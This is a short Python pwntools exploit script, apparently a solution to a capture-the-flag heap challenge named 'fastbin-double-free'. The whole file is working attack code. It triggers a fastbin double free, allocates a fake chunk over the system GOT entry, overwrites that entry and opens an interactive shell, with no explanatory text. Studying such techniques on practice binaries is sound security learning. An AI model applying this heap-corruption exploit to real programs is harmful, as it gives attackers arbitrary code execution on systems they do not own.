#!/usr/bin/env python
from pwn import *
p = process('./fastbin-double-free')
elf = ELF('./fastbin-double-free')

def cmd(x):
	p.recvuntil('>')
	p.sendline(x)

def malloc(i, size, s):
	cmd('1 {} {}\n{}'.format(str(i), str(size), s))

def free(i):
	cmd('2 {}'.format(str(i)))

sh = elf.symbols['sh']
system_got = elf.got['system']
malloc(0, 56, '\x00')
malloc(1, 56, '\x00')
free(0)
free(1)
free(0)
#0x60102a
malloc(2, 56, p64(system_got - 6))
malloc(3, 56, '\x00')
malloc(4, 56, '\x00')
gdb.attach(p)
malloc(5, 56, 'sh' + '\x00' * 20 + p64(sh))
malloc(6, system_got + 10, '\x00')
p.interactive()
